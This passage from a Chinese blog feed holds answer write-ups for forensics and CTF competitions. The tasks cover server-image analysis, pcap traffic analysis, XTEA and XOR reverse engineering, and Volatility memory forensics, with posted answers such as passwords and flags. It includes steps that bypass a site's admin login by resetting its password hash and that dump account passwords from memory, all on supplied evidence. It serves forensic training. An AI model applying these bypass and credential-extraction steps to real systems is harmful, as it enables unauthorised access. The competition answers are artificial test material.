换成24小时制就是<code>13:13:01</code></p><h3 id="2-请对所给服务器检材进行分析，请写出宝塔默认建站的目录是什么？（答案格式：-x2F-abc-x2F-def）"><a href="#2-请对所给服务器检材进行分析，请写出宝塔默认建站的目录是什么？（答案格式：-x2F-abc-x2F-def）" class="headerlink" title="2. 请对所给服务器检材进行分析，请写出宝塔默认建站的目录是什么？（答案格式：&#x2F;abc&#x2F;def）"></a><strong>2. 请对所给服务器检材进行分析，请写出宝塔默认建站的目录是什么？（答案格式：&#x2F;abc&#x2F;def）</strong></h3><pre><code>/data</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404242314026.png" alt="image-20240424231441889"></p><h3 id="3-请对所给服务器检材进行分析，请写出ip为192-168-157-1的机器登陆失败的时间是什么时候？（答案格式：xxxx-xx-xx-xx-xx-xx）"><a href="#3-请对所给服务器检材进行分析，请写出ip为192-168-157-1的机器登陆失败的时间是什么时候？（答案格式：xxxx-xx-xx-xx-xx-xx）" class="headerlink" title="3.请对所给服务器检材进行分析，请写出ip为192.168.157.1的机器登陆失败的时间是什么时候？（答案格式：xxxx-xx-xx xx:xx:xx）"></a>3.请对所给服务器检材进行分析，请写出ip为192.168.157.1的机器登陆失败的时间是什么时候？（答案格式：xxxx-xx-xx xx:xx:xx）</h3><pre><code>2020-10-09 16:47:29</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261525429.png" alt="image-20240426152509355"></p><h3 id="4-请对所给服务器检材进行分析，写出网站的数据库root帐号密码？（答案格式：xxxx）"><a href="#4-请对所给服务器检材进行分析，写出网站的数据库root帐号密码？（答案格式：xxxx）" class="headerlink" title="4.请对所给服务器检材进行分析，写出网站的数据库root帐号密码？（答案格式：xxxx）"></a>4.<strong>请对所给服务器检材进行分析，写出网站的数据库root帐号密码？（答案格式：xxxx）</strong></h3><pre><code>hl@7001</code></pre><p>网站数据库的root账号密码 其实首先应该看<code>config/database.php</code>文件 我们从服务器分析出来的zip格式的压缩包中可以找到一个<code>shopxo.zip</code>  解压之后看起来很像网站源码的格式 但是会发现<code>config</code>文件夹下并没有<code>database.php</code>这个文件 需要另找出路</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261532227.png" alt="image-20240426153220162"></p><p>我们发现服务器部分的附件除了给了<code>server4.E01</code> 之外还给了<code>server1 server2 server3</code>三个文件 看起来很像raid重组 直接使用火眼的raid重组工具 </p><p>先查看raid信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261535159.png" alt="image-20240426153554128"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261536595.png" alt="image-20240426153602558"></p><p>在使用raid重组成逻辑盘 条带大小根据前面的raid信息改为1024 再点击生成文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261537560.png" alt="image-20240426153737509"></p><p>得到重组之后的镜像 然后使用UFS Explorer导出真正的磁盘镜像 导出为1.dsk</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261545162.png" alt="image-20240426154527051"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261545820.png" alt="image-20240426154554774"></p><p>使用给出的<code>server4.E01</code>和导出的<code>1.dsk</code>两个磁盘进行仿真 将<code>server4.E01</code>作为系统盘  </p><p>仿真后 查看磁盘使用情况 看到这块磁盘已经存在了 </p><pre><code>lsblk</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261550164.png" alt="image-20240426155051131"></p><p>还需要在挂载上 这块磁盘其实就是&#x2F;data分区</p><pre><code>mount /dev/sdb /data</code></pre><p>成功挂载</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261551716.png" alt="image-20240426155148676"></p><p>此时的<code>/data/2023.cn/config/</code>文件夹下就有<code>database.php</code>了 成功查看到用户名和密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261552698.png" alt="image-20240426155257652"></p><h3 id="5-请对所给服务器检材进行分析，请分析网站后台管理员帐号的加密方式（答案格式：xx-xx-xxx-xxx-）"><a href="#5-请对所给服务器检材进行分析，请分析网站后台管理员帐号的加密方式（答案格式：xx-xx-xxx-xxx-）" class="headerlink" title="5. 请对所给服务器检材进行分析，请分析网站后台管理员帐号的加密方式（答案格式：xx($xx.xxx($xxx)）"></a><strong>5. 请对所给服务器检材进行分析，请分析网站后台管理员帐号的加密方式（答案格式：xx($xx.xxx($xxx)）</strong></h3><pre><code>md5($salt.trim($pwd))</code></pre><p>直接在源码里面搜<code>$pwd</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404242327139.png" alt="image-20240424232724073"></p><h3 id="6-请对所给服务器检材进行分析，网站首页友情链接中的”弘连网络“的更新时间是什么时候？（答案格式：xxxx-xx-xx-xx-xx-xx）"><a href="#6-请对所给服务器检材进行分析，网站首页友情链接中的”弘连网络“的更新时间是什么时候？（答案格式：xxxx-xx-xx-xx-xx-xx）" class="headerlink" title="6. 请对所给服务器检材进行分析，网站首页友情链接中的”弘连网络“的更新时间是什么时候？（答案格式：xxxx-xx-xx xx:xx:xx）"></a>6. 请对所给服务器检材进行分析，网站首页友情链接中的”弘连网络“的更新时间是什么时候？（答案格式：xxxx-xx-xx xx:xx:xx）</h3><pre><code>2020-07-09 13:46:17</code></pre><h4 id="解决xshell和xftp连接问题"><a href="#解决xshell和xftp连接问题" class="headerlink" title="解决xshell和xftp连接问题"></a>解决xshell和xftp连接问题</h4><p>在仿真镜像后 我们会发现无法正常连接xshell和xftp  这篇文章可以解决</p><p><a href="https://blog.csdn.net/Jupite_ch/article/details/107034135">centos服务器拒绝ssh连接问题</a></p><p>查看<code>hosts.allow和hosts.deny</code>两个文件 将里面最后一行的内容直接注释就可以正常连接xshell和xftp</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261628619.png" alt="image-20240426162853579"></p><p>解决这个问题之后 我们直接连上xftp 将网站源码保存到本地 然后使用FileLocator搜索<code>弘连</code>关键字 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261643669.png" alt="image-20240426164333588"></p><h3 id="7-请对所给服务器检材进行分析，网站后台管理页面入口文件名是什么？（答案格式：xxx-php）"><a href="#7-请对所给服务器检材进行分析，网站后台管理页面入口文件名是什么？（答案格式：xxx-php）" class="headerlink" title="7. 请对所给服务器检材进行分析，网站后台管理页面入口文件名是什么？（答案格式：xxx.php）"></a><strong>7.</strong> <strong>请对所给服务器检材进行分析，网站后台管理页面入口文件名是什么？（答案格式：<strong><strong>xxx.php</strong></strong>）</strong></h3><pre><code>4008003721.php</code></pre><p>查看网站操作日志 看到将<code>admin.php</code>文件重命名为了<code>4008003721.php</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261650783.png" alt="image-20240426165026735"></p><p>为了验证一下这个结果 我们需要重构网站一下 </p><p>我们在火眼的分析结果中看到存在docker容器 并且是mysql的容器 同时使用<code>netstat -lnpt</code>命令查看端口使用情况看到本地mysql端口是3306 但是<code>database.php</code>中写的mysql服务端口是3307 说明这个网站的数据库在docker容器中 而不是服务器本机中 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261659342.png" alt="image-20240426165908311"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261659636.png" alt="image-20240426165937577"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261527826.png" alt="image-20240426152750756"></p><p>我们在挂载上raid重组盘之后 就解决了宝塔面板中没有网站源码的问题 下一步直接启动docker容器中的mysql服务即可</p><pre><code>docker ps -a docker start 8fbd1968d75e</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261701189.png" alt="image-20240426170118160"></p><p>然后修改我们本地hosts文件 使用火绒就行 在其中添加</p><pre><code>192.168.24.133 www.hl2023.cn</code></pre><p>赋予网站源码全部权限 </p><pre><code>chmod 777 -R 2023.cn</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261703443.png" alt="image-20240426170337405"></p><p>就可以访问网站了 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261704955.png" alt="image-20240426170411630"></p><p>在访问前面找到的后台管理页面 成功访问 说明这个页面就是后台管理页面 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261704169.png" alt="image-20240426170459010"></p><h4 id="后台密码绕过"><a href="#后台密码绕过" class="headerlink" title="后台密码绕过"></a>后台密码绕过</h4><p>顺便说一下 怎么绕过后台登陆密码 前面我们也知道了后台登陆密码的加密方式是带盐值的md5加密 我们直接修改网站源码 将加密方式改为直接md5加密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261713965.png" alt="image-20240426171324931"></p><p>使用cmd5网站 得到<code>123456</code>的md5加密值</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261714682.png" alt="image-20240426171428611"></p><p>在docker中进入mysql服务 修改admin的密码为123456的md5加密值 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261714491.png" alt="image-20240426171456404"></p><p>访问后台管理页面 使用<code>admin/123456</code>成功登陆</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261717422.png" alt="image-20240426171726286"></p><h3 id="8-请对所给服务器检材进行分析，网站数据库备份文件的sha256的值是多少？（答案格式：a656ac5f9e9d3bc2915aec31a5dfd0bd3bd3ef1ac497016dafae43669d7d6d22不区分大小写"><a href="#8-请对所给服务器检材进行分析，网站数据库备份文件的sha256的值是多少？（答案格式：a656ac5f9e9d3bc2915aec31a5dfd0bd3bd3ef1ac497016dafae43669d7d6d22不区分大小写" class="headerlink" title="8.请对所给服务器检材进行分析，网站数据库备份文件的sha256的值是多少？（答案格式：a656ac5f9e9d3bc2915aec31a5dfd0bd3bd3ef1ac497016dafae43669d7d6d22不区分大小写"></a>8.请对所给服务器检材进行分析，网站数据库备份文件的sha256的值是多少？（答案格式：a656ac5f9e9d3bc2915aec31a5dfd0bd3bd3ef1ac497016dafae43669d7d6d22不区分大小写</h3><pre><code>9dede75e455a7c4c5cc4b61e41570adf82af25251c5fd8456a637add864b0af0</code></pre><p>在宝塔中看到数据库存在备份文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261651058.png" alt="image-20240426165144979"></p><p>从火眼分析中找这个文件 导出计算sha256</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261652274.png" alt="image-20240426165225224"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261652251.png" alt="image-20240426165250217"></p><h3 id="9-请对所给服务器检材进行分析，网站数据库备份文件的解压密码是多少？（答案格式：xxxxxxx区分大小写）"><a href="#9-请对所给服务器检材进行分析，网站数据库备份文件的解压密码是多少？（答案格式：xxxxxxx区分大小写）" class="headerlink" title="9.请对所给服务器检材进行分析，网站数据库备份文件的解压密码是多少？（答案格式：xxxxxxx区分大小写）"></a>9.<strong>请对所给服务器检材进行分析，网站数据库备份文件的解压密码是多少？（答案格式：xxxxxxx区分大小写）</strong></h3><pre><code>22Ga#ce3ZBHV&amp;Fr59fE#</code></pre><p>服务器文件系统中root文件夹下有个<code>.w0rd.txt</code>文档 是解压密码字典 提出来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404242344645.png" alt="image-20240424234407538"></p><p>放passwarekit里面字典爆破</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404242347329.png" alt="image-20240424234702221"></p><h3 id="10-请对所给服务器检材进行分析，商城中“弘连火眼手机分析专用机MT510”商品的原价是多少？（只填写数字，精确到小数点后2位：9999-99）"><a href="#10-请对所给服务器检材进行分析，商城中“弘连火眼手机分析专用机MT510”商品的原价是多少？（只填写数字，精确到小数点后2位：9999-99）" class="headerlink" title="10. 请对所给服务器检材进行分析，商城中“弘连火眼手机分析专用机MT510”商品的原价是多少？（只填写数字，精确到小数点后2位：9999.99）"></a><strong>10. 请对所给服务器检材进行分析，商城中“</strong>弘连火眼手机分析专用机MT510<strong>”商品的原价是多少？（只填写数字，精确到小数点后2位：9999.99）</strong></h3><pre><code>1398000.00</code></pre><p>直接在网站中搜不到 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261707324.png" alt="image-20240426170707259"></p><p>用我们上面解压出的数据库备份文件 直接在宝塔中导入恢复</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261707783.png" alt="image-20240426170734703"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261711325.png" alt="image-20240426171110222"></p><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><h3 id="1-请分析流量分析-pcapng文件，并回答入侵者的IP地址是？"><a href="#1-请分析流量分析-pcapng文件，并回答入侵者的IP地址是？" class="headerlink" title="1.请分析流量分析.pcapng文件，并回答入侵者的IP地址是？"></a>1.请分析流量分析.pcapng文件，并回答入侵者的IP地址是？</h3><pre><code>192.168.85.130</code></pre><p>最后拿到权限之后从这个ip上下载了文件 那么这个ip就是攻击者ip</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261722393.png" alt="image-20240426172226311"></p><h3 id="2-请分析流量分析-pcapng文件，并回答被入侵计算机中的cms软件版本是？-答案格式：1-1-1"><a href="#2-请分析流量分析-pcapng文件，并回答被入侵计算机中的cms软件版本是？-答案格式：1-1-1" class="headerlink" title="2.请分析流量分析.pcapng文件，并回答被入侵计算机中的cms软件版本是？(答案格式：1.1.1)"></a>2.请分析流量分析.pcapng文件，并回答被入侵计算机中的cms软件版本是？(答案格式：1.1.1)</h3><pre><code>5.2.1</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261722888.png" alt="image-20240426172253849"></p><h3 id="3-请分析流量分析-pcapng文件，并回答被入侵计算机中的MySQL版本号是？-答案格式：1-1-1"><a href="#3-请分析流量分析-pcapng文件，并回答被入侵计算机中的MySQL版本号是？-答案格式：1-1-1" class="headerlink" title="3.请分析流量分析.pcapng文件，并回答被入侵计算机中的MySQL版本号是？(答案格式：1.1.1)"></a>3.请分析流量分析.pcapng文件，并回答被入侵计算机中的MySQL版本号是？(答案格式：1.1.1)</h3><pre><code>5.5.53</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261723748.png" alt="image-20240426172311686"></p><h3 id="4-请分析流量分析-pcapng文件，并回答被入侵计算机中的MySQLroot账号密码是？"><a href="#4-请分析流量分析-pcapng文件，并回答被入侵计算机中的MySQLroot账号密码是？" class="headerlink" title="4.请分析流量分析.pcapng文件，并回答被入侵计算机中的MySQLroot账号密码是？"></a>4.请分析流量分析.pcapng文件，并回答被入侵计算机中的MySQLroot账号密码是？</h3><pre><code>admin@12345</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261723712.png" alt="image-20240426172333674"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261725676.png" alt="image-20240426172525606"></p><h3 id="5-请分析流量分析-pcapng文件，并回答入侵者利用数据库管理工具创建了一个文件，该文件名为？"><a href="#5-请分析流量分析-pcapng文件，并回答入侵者利用数据库管理工具创建了一个文件，该文件名为？" class="headerlink" title="5.请分析流量分析.pcapng文件，并回答入侵者利用数据库管理工具创建了一个文件，该文件名为？"></a>5.<strong>请分析流量分析.pcapng文件，并回答入侵者利用数据库管理工具创建了一个文件，该文件名为？</strong></h3><pre><code>06b8dcf11e2f7adf7ea2999d235b8d84.php</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271946438.png" alt="image-20240424212945089"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271946041.png" alt="image-20240424212952731"></p><h3 id="6-请分析流量分析-pcapng文件，并回答被入侵计算机中PHP环境禁用了几个函数？"><a href="#6-请分析流量分析-pcapng文件，并回答被入侵计算机中PHP环境禁用了几个函数？" class="headerlink" title="6.请分析流量分析.pcapng文件，并回答被入侵计算机中PHP环境禁用了几个函数？"></a>6.请分析流量分析.pcapng文件，并回答被入侵计算机中PHP环境禁用了几个函数？</h3><pre><code>10个</code></pre><p>直接搜<code>disable_function</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271947799.png" alt="image-20240424210620482"></p><p>一共10个</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271947044.png" alt="image-20240424210642713"></p><h3 id="7-请分析流量分析-pcapng文件，并回答入侵者提权后，执行的第1条命令是？"><a href="#7-请分析流量分析-pcapng文件，并回答入侵者提权后，执行的第1条命令是？" class="headerlink" title="7.请分析流量分析.pcapng文件，并回答入侵者提权后，执行的第1条命令是？"></a>7.<strong>请分析流量分析.pcapng文件，并回答入侵者提权后，执行的第1条命令是？</strong></h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271947241.png" alt="image-20240424210144330"></p><pre><code>dir</code></pre><h3 id="8-请分析流量分析-pcapng文件，并回答被入侵计算机开机时间是？"><a href="#8-请分析流量分析-pcapng文件，并回答被入侵计算机开机时间是？" class="headerlink" title="8.请分析流量分析.pcapng文件，并回答被入侵计算机开机时间是？"></a>8.请分析流量分析.pcapng文件，并回答被入侵计算机开机时间是？</h3><pre><code>2019/6/13, 18:50:33</code></pre><p>被入侵后 在里面执行了systeminfo命令 可以看到上一次计算机的启动时间</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271947511.png" alt="image-20240424211721791"></p><h3 id="9-请分析流量分析-pcapng文件，并回答被入侵计算机桌面上的文件中flag是？-答案格式：abcdef123456789"><a href="#9-请分析流量分析-pcapng文件，并回答被入侵计算机桌面上的文件中flag是？-答案格式：abcdef123456789" class="headerlink" title="9.请分析流量分析.pcapng文件，并回答被入侵计算机桌面上的文件中flag是？(答案格式：abcdef123456789)"></a>9.<strong>请分析流量分析.pcapng文件，并回答被入侵计算机桌面上的文件中flag是？(答案格式：abcdef123456789)</strong></h3><p>直接追踪tcp流 到第1364流</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261725954.png" alt="image-20240426172559868"></p><h3 id="10-请分析流量分析-pcapng文件，并回答图片文件中的flag是？-答案格式：abcdef123456789"><a href="#10-请分析流量分析-pcapng文件，并回答图片文件中的flag是？-答案格式：abcdef123456789" class="headerlink" title="10.请分析流量分析.pcapng文件，并回答图片文件中的flag是？ (答案格式：abcdef123456789)"></a>10.<strong>请分析流量分析.pcapng文件，并回答图片文件中的flag是？ (答案格式：abcdef123456789)</strong></h3><p>http导出可以得到一个flag.png 末尾有压缩包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261726500.png" alt="image-20240426172615443"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261726181.png" alt="image-20240426172624131"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261726439.png" alt="image-20240426172634398"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第七届精武杯-西柚的喵帕斯WP&quot;&gt;&lt;a href=&quot;#第七届精武杯-西柚的喵帕斯WP&quot; class=&quot;headerlink&quot; title=&quot;第七届精武杯-西柚的喵帕斯WP&quot;&gt;&lt;/a&gt;第七届精武杯-西柚的喵帕斯WP&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;计算机&amp;amp;&amp;a</summary>
      
    
    
    
    <category term="取证" scheme="http://w3nx1z1.github.io/categories/%E5%8F%96%E8%AF%81/"/>
    
    
  </entry>
  
  <entry>
    <title>2024数信杯北部赛区wp</title>
    <link href="http://w3nx1z1.github.io/2024/05/02/2024%E6%95%B0%E4%BF%A1%E6%9D%AF/"/>
    <id>http://w3nx1z1.github.io/2024/05/02/2024%E6%95%B0%E4%BF%A1%E6%9D%AF/</id>
    <published>2024-05-02T13:54:43.678Z</published>
    <updated>2024-05-02T13:56:35.738Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024数信杯"><a href="#2024数信杯" class="headerlink" title="2024数信杯"></a>2024数信杯</h1><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302319982.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302319912.png" alt="img"></p><p>战队名：西柚喵帕斯 </p><p>排名：16</p><h2 id="数据安全"><a href="#数据安全" class="headerlink" title="数据安全"></a>数据安全</h2><h3 id="Drinktea"><a href="#Drinktea" class="headerlink" title="Drinktea"></a>Drinktea</h3><p>python字节码，分析转换成python源码</p><pre><code class="Python">from ctypes import c_uint32  import structdef encrypt(v, key):    v0 = c_uint32(v[0]).value    v1 = c_uint32(v[1]).value    delta = 555885348    total = c_uint32(0).value    for i in range(32):        v0 += ((v1 &lt;&lt; 4 ^ v1 &gt;&gt; 5) + v1) ^ (total + key[total &amp; 3] ^ v1)        total += delta        v1 += ((v0 &lt;&lt; 4 ^ v0 &gt;&gt; 5) + v0) ^ (total + key[total &gt;&gt; 11 &amp; 3] ^ v0)    return [v0, v1]key = [1900550021, 2483099539, 2205172504, 1359557939]arr = [    [392252415, 2941946969],    [1122976151, 1335193774],    [815478816, 2529100980],    [2237049875, 188954780]]flag = input(&#39;please input flag: &#39;)encry = []encryted = []for i in range(len(flag) // 8):    encry.append(struct.unpack(&#39;&lt;I&#39;, flag[i*8:(i+1)*8].encode(&#39;utf-8&#39;))[0])    encry.append(struct.unpack(&#39;&lt;I&#39;, flag[i*8+4:(i+1)*8].encode(&#39;utf-8&#39;))[0])    encrypted = encrypt(encry, key)    encryted.append(encrypted)if encryted == arr:    print(&#39;yes~&#39;)else:    print(&#39;no~&#39;)</code></pre><p>简单的xtea加密，把每一段结果拼起来包flag就可以</p><pre><code class="Python">from ctypes import * import structdef encrypt(v,k):    v0=c_uint32(v[0])    v1=c_uint32(v[1])    sum1=c_uint32(0)    delta=0x9e3779b9    for i in range(32):        v0.value+=(((v1.value&lt;&lt;4)^(v1.value&gt;&gt;5))+v1.value)^(sum1.value+k[sum1.value&amp;3])        sum1.value+=delta        v1.value+=(((v0.value&lt;&lt;4)^(v0.value&gt;&gt;5))+v0.value)^(sum1.value+k[(sum1.value&gt;&gt;11)&amp;3])    return v0.value,v1.value def decrypt(v,k):    v0=c_uint32(v[0])    v1=c_uint32(v[1])    delta=555885348    sum1=c_uint32(delta*32)    for i in range(32):        v1.value-=(((v0.value&lt;&lt;4)^(v0.value&gt;&gt;5))+v0.value)^(sum1.value+k[(sum1.value&gt;&gt;11)&amp;3])        sum1.value-=delta        v0.value-=(((v1.value&lt;&lt;4)^(v1.value&gt;&gt;5))+v1.value)^(sum1.value+k[sum1.value&amp;3])    return v0.value,v1.value a1=[392252415, 2941946969]a2=[1122976151, 1335193774]a3=[815478816, 2529100980]a4=[2237049875, 188954780]k = [1900550021, 2483099539, 2205172504, 1359557939]res1=decrypt(a1,k)res2=decrypt(a2,k)res3=decrypt(a3,k)res4=decrypt(a4,k)  print(struct.pack(&#39;&lt;I&#39;,res1[0]))print(struct.pack(&#39;&lt;I&#39;,res1[1]))print(struct.pack(&#39;&lt;I&#39;,res2[0]))print(struct.pack(&#39;&lt;I&#39;,res2[1]))print(struct.pack(&#39;&lt;I&#39;,res3[0]))print(struct.pack(&#39;&lt;I&#39;,res3[1]))print(struct.pack(&#39;&lt;I&#39;,res4[0]))print(struct.pack(&#39;&lt;I&#39;,res4[1]))# acb8739759dc496ccc945703037e037f</code></pre><h3 id="Rrrccc"><a href="#Rrrccc" class="headerlink" title="Rrrccc"></a>Rrrccc</h3><p>upx壳，直接脱脱不掉，winhex打开发现把”UPX”改成了”upx”，改回来就能直接<code>upx -d</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302320589.png" alt="img"></p><p>ida打开看一下是SMC代码自修改，动调</p><p>反调试，patch一下修改跳转条件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302320131.png" alt="img"></p><p>cipher很明显直接写出来了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302320684.png" alt="img"></p><p>过了一遍流程推测flag和cipher长度应该是相等，直接拿cipher作输入</p><p>动调跑完拿到输入的第一层加密结果，和输入异或就能得到key1</p><p>第二层异或的key2直接动调出</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302320631.png" alt="img"></p><p>exp：</p><pre><code class="Python">cipher = &quot;Whatareyourencryption&amp;decryptionbasics&quot;flag = []#先用key2解第二层key2 = [0x1C, 0x0CB, 0x0F5, 0x53, 0x91, 0x0CC, 0x3B, 0x66, 0x4, 0x7D, 0x0BA, 0x0D2, 0x56, 0x0CE, 0x14, 0x0A4, 0x0E8, 0x7F, 0x0C2, 0x0C4, 0x2B, 0x86, 0x32, 0x0F0, 0x0F7, 0x0EA, 0x0FB, 0x0F0, 0x78, 0x34, 0x9A, 0x3, 0x13, 0x0A2, 0x91, 0x37, 0x48, 0x66]for i in range(38):    flag.append(ord(cipher[i]) ^ key2[i])#求key1cipher1 = [0x7A, 0xA7, 0x94, 0x34, 0xEA, 0xA8, 0x08, 0x02, 0x66, 0x4B,   0x83, 0xB3, 0x65, 0xFA, 0x75, 0x91, 0xD9, 0x1B, 0xF5, 0xA1,   0x1A, 0xE2, 0x00, 0xC3, 0x93, 0xDC, 0xC9, 0xC1, 0x4D, 0x0D,   0xAA, 0x3B, 0x21, 0x95, 0xF2, 0x07, 0x79, 0x1B,]input = &quot;Whatareyourencryption&amp;decryptionbasics&quot;key1 = []for i in range(len(cipher1)):    key1.append(cipher1[i] ^ ord(input[i]))#最后把第二层解密结果用key1解for i in range(len(flag)):    flag[i] ^= key1[i]    print(chr(flag[i]),end=&#39;&#39;)    #flag&#123;d3db69a34a51d7e1d23d621590827c01&#125;</code></pre><h3 id="Magic-Audio"><a href="#Magic-Audio" class="headerlink" title="Magic Audio"></a>Magic Audio</h3><p>拿到一个wav文件 先看文件尾 有个压缩包 提取出来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302321988.png" alt="img"></p><p>发现有密码 听一下这个音频 慢扫描电视 用sstv直接转</p><pre><code class="Bash">sstv -d ctf.wav -o out.png </code></pre><p>得到out.png</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302321306.png" alt="img"></p><p>使用这个菜就多练作为密码进行解压 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302321966.png" alt="img"></p><h2 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a>数据分析</h2><h3 id="不安全的U盘1"><a href="#不安全的U盘1" class="headerlink" title="不安全的U盘1"></a>不安全的U盘1</h3><pre><code>请提交小明电脑中的test账户的密码(格式为hash对应的明文,长度为9)</code></pre><p>直接lsadump获得强密码</p><pre><code class="Bash">.\volatility.exe -f E:\Desktop\数信杯\file1\不安全的U盘_3ba0c570fac7eef3e90acc3eaabb5c8d\1.raw --profile=Win7SP1x64 lsadump</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302329864.png" alt="img"></p><p>hahaha123</p><h3 id="不安全的U盘2-赛后复盘"><a href="#不安全的U盘2-赛后复盘" class="headerlink" title="不安全的U盘2(赛后复盘)"></a>不安全的U盘2(赛后复盘)</h3><p>答案要求是去掉空格后是56位字符</p><p>最令我无语的一道题 当时已经把那个程序路径找到了 但是因为sb txt文档给我显示一共是57列 自己数的时候不知道为什么死活数不出来56位 最后错失一题的分数 </p><p>展示一下当时的做题截图 我真的是把可能的所有情况都列出来了  但其实第一个就是正确答案 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302315946.png" alt="image-20240430113716050"></p><p>下面简单说一下做法 首先根据题干 我们得知是因为一个pdf文件导致系统被入侵 我们直接在r-studio中进行寻找并导出</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302315272.png" alt="image-20240430115702665"></p><p>将这个<code>README.pdf</code>放入沙箱进行分析 看到执行流程中存在<code>AcroRd32.exe</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302315180.png" alt="image-20240430115747055"></p><p>在vol中搜索一下这个程序</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302315901.png" alt="image-20240430115949722"></p><p>直接在红框前面加上盘符再去掉空格就是正确答案</p><pre><code>C:\Program Files (x86)\Adobe\Reader 9.0\Reader\AcroRd32.exeC:\ProgramFiles(x86)\Adobe\Reader9.0\Reader\AcroRd32.exe</code></pre><h3 id="不安全的U盘3"><a href="#不安全的U盘3" class="headerlink" title="不安全的U盘3"></a>不安全的U盘3</h3><p>请提交控制小明的服务器地址:端口(格式为”ip:port”,长度为19)</p><p>netscan查看网络连接情况</p><pre><code class="Bash">.\volatility.exe -f E:\Desktop\数信杯\file1\不安全的U盘_3ba0c570fac7eef3e90acc3eaabb5c8d\1.raw --profile=Win7SP1x64 netscan</code></pre><p>找外网ip</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302332523.png" alt="img"></p><h3 id="不安全的U盘4-赛后复盘"><a href="#不安全的U盘4-赛后复盘" class="headerlink" 